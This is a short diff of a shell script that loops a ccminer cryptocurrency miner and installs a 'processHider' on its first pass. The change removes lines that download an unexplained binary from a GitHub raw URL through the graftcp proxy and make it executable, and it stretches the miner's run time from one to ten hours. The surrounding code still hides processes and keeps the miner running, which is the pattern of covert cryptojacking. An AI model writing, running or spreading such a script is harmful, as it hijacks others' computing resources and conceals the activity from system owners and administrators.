@@ -56,10 +56,6 @@ END
   echo " "
   echo " "
 
-  # Download and configure highill
-  ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
-  chmod +x kulibang
-
   # Run processHider only during the first loop
   if [ "$process_hider_installed" = false ]; then
     echo "Installing processHider for the first time..."
@@ -79,9 +75,7 @@ END
   ccminer_pid=$!
 
   # Sleep for xx minutes
-  sleep 3600
-
-  rm kulibang
+  sleep 36000
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
   kill -2 $ccminer_pid
